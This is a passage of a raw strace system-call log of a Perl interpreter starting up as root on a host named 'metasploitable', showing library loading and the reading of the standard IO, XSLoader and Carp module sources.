\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
9851  20:00:43.699199 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
9851  20:00:43.699217 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fc0000
9851  20:00:43.699229 mmap2(0xb7fc2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fc2000
9851  20:00:43.699246 close(1)          = 0
9851  20:00:43.699257 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9851  20:00:43.699272 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
9851  20:00:43.699293 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
9851  20:00:43.699381 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
9851  20:00:43.699398 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f9b000
9851  20:00:43.699410 mmap2(0xb7fbe000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7fbe000
9851  20:00:43.699426 close(1)          = 0
9851  20:00:43.699438 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9851  20:00:43.699453 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
9851  20:00:43.699467 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
9851  20:00:43.699607 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
9851  20:00:43.699890 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f9a000
9851  20:00:43.700014 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f82000
9851  20:00:43.700074 mmap2(0xb7f96000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f96000
9851  20:00:43.700115 mmap2(0xb7f98000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f98000
9851  20:00:43.700144 close(1)          = 0
9851  20:00:43.700168 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9851  20:00:43.700185 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
9851  20:00:43.700200 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
9851  20:00:43.700295 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
9851  20:00:43.700313 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e33000
9851  20:00:43.700325 mmap2(0xb7f7c000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f7c000
9851  20:00:43.700340 mmap2(0xb7f7f000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f7f000
9851  20:00:43.700354 close(1)          = 0
9851  20:00:43.700366 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9851  20:00:43.700379 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
9851  20:00:43.700394 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
9851  20:00:43.700493 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
9851  20:00:43.700511 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e01000
9851  20:00:43.700522 mmap2(0xb7e0a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e0a000
9851  20:00:43.700537 mmap2(0xb7e0c000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e0c000
9851  20:00:43.700551 close(1)          = 0
9851  20:00:43.700575 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e00000
9851  20:00:43.700588 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e008c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
9851  20:00:43.700653 mprotect(0xb7f7c000, 4096, PROT_READ) = 0
9851  20:00:43.700680 munmap(0xb7fc4000, 29913) = 0
9851  20:00:43.700694 set_tid_address(0xb7e00908) = 9851
9851  20:00:43.700704 set_robust_list(0xb7e00910, 0xc) = 0
9851  20:00:43.700713 futex(0xbf9f0690, 0x81 /* FUTEX_??? */, 1) = 0
9851  20:00:43.700728 rt_sigaction(SIGRTMIN, {0xb7f862c0, [], SA_SIGINFO}, NULL, 8) = 0
9851  20:00:43.700742 rt_sigaction(SIGRT_1, {0xb7f86340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
9851  20:00:43.700754 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
9851  20:00:43.700768 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
9851  20:00:43.700788 uname({sys="Linux", node="metasploitable", ...}) = 0
9851  20:00:43.700839 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
9851  20:00:43.700890 brk(0)            = 0x8153000
9851  20:00:43.700900 brk(0x8174000)    = 0x8174000
9851  20:00:43.700955 getuid32()        = 0
9851  20:00:43.700967 geteuid32()       = 0
9851  20:00:43.700976 getgid32()        = 0
9851  20:00:43.700986 getegid32()       = 0
9851  20:00:43.701024 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ddf000
9851  20:00:43.701053 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
9851  20:00:43.701071 read(1, "\331v\304\6", 4) = 4
9851  20:00:43.701088 close(1)          = 0
9851  20:00:43.701106 time(NULL)        = 1495670443
9851  20:00:43.701149 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbf9f0360) = -1 ENOENT (No such file or directory)
9851  20:00:43.701167 stat64("/usr/local/lib/site_perl/5.8.8", 0xbf9f0360) = -1 ENOENT (No such file or directory)
9851  20:00:43.701180 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbf9f0360) = -1 ENOENT (No such file or directory)
9851  20:00:43.701196 stat64("/usr/local/lib/perl/5.8.7", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701209 stat64("/usr/local/share/perl/5.8.7", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701221 stat64("/usr/local/lib/perl/5.8.6", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701233 stat64("/usr/local/share/perl/5.8.6", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701245 stat64("/usr/local/lib/perl/5.8.4", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701257 stat64("/usr/local/share/perl/5.8.4", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701269 stat64("/usr/local/lib/perl/5.8.3", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701281 stat64("/usr/local/share/perl/5.8.3", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701292 stat64("/usr/local/lib/perl/5.8.2", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701304 stat64("/usr/local/share/perl/5.8.2", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701316 stat64("/usr/local/lib/perl/5.8.1", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701328 stat64("/usr/local/share/perl/5.8.1", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701340 stat64("/usr/local/lib/perl/5.8.0", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701351 stat64("/usr/local/share/perl/5.8.0", 0xbf9f04a0) = -1 ENOENT (No such file or directory)
9851  20:00:43.701374 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9f0198) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.701388 _llseek(0, 0, [0], SEEK_CUR) = 0
9851  20:00:43.701400 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9f0198) = -1 EBADF (Bad file descriptor)
9851  20:00:43.701411 _llseek(1, 0, 0xbf9f01e0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
9851  20:00:43.701421 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9f0198) = -1 EINVAL (Invalid argument)
9851  20:00:43.701432 _llseek(2, 0, 0xbf9f01e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
9851  20:00:43.701457 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
9851  20:00:43.701471 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9f0258) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.701482 _llseek(1, 0, [0], SEEK_CUR) = 0
9851  20:00:43.701493 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
9851  20:00:43.701505 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
9851  20:00:43.701524 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
9851  20:00:43.701578 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
9851  20:00:43.701625 getppid()         = 9849
9851  20:00:43.701689 stat64("/etc/perl/IO.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701703 stat64("/etc/perl/IO.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701717 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701730 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701748 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701761 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701775 stat64("/usr/lib/perl5/IO.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701787 stat64("/usr/lib/perl5/IO.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701800 stat64("/usr/share/perl5/IO.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701813 stat64("/usr/share/perl5/IO.pm", 0xbf9efe5c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701826 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbf9eff4c) = -1 ENOENT (No such file or directory)
9851  20:00:43.701839 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
9851  20:00:43.701859 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
9851  20:00:43.701873 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9efc68) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.701884 _llseek(6, 0, [0], SEEK_CUR) = 0
9851  20:00:43.701908 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
9851  20:00:43.701978 stat64("/etc/perl/XSLoader.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.702017 stat64("/etc/perl/XSLoader.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.702031 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.702044 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.702098 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.702111 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.702125 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.702137 stat64("/usr/lib/perl5/XSLoader.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.702150 stat64("/usr/share/perl5/XSLoader.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.702163 stat64("/usr/share/perl5/XSLoader.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.702176 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.702189 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
9851  20:00:43.702210 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.702224 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.702235 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.702256 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
9851  20:00:43.702558 brk(0x8195000)    = 0x8195000
9851  20:00:43.702880 _llseek(8, 3407, [3407], SEEK_SET) = 0
9851  20:00:43.702898 _llseek(8, 0, [3407], SEEK_CUR) = 0
9851  20:00:43.702909 close(8)          = 0
9851  20:00:43.702966 stat64("/etc/perl/Carp.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.702983 stat64("/etc/perl/Carp.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.702998 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703011 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703025 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703038 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703052 stat64("/usr/lib/perl5/Carp.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703064 stat64("/usr/lib/perl5/Carp.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703077 stat64("/usr/share/perl5/Carp.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703089 stat64("/usr/share/perl5/Carp.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703109 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703122 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbf9ef9ac) = -1 ENOENT (No such file or directory)
9851  20:00:43.703136 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbf9efa9c) = -1 ENOENT (No such file or directory)
9851  20:00:43.703149 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
9851  20:00:43.703171 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
9851  20:00:43.703185 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ef7b8) = -1 ENOTTY (Inappropriate ioctl for device)
9851  20:00:43.703197 _llseek(8, 0, [0], SEEK_CUR) = 0
9851  20:00:43.703215 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# 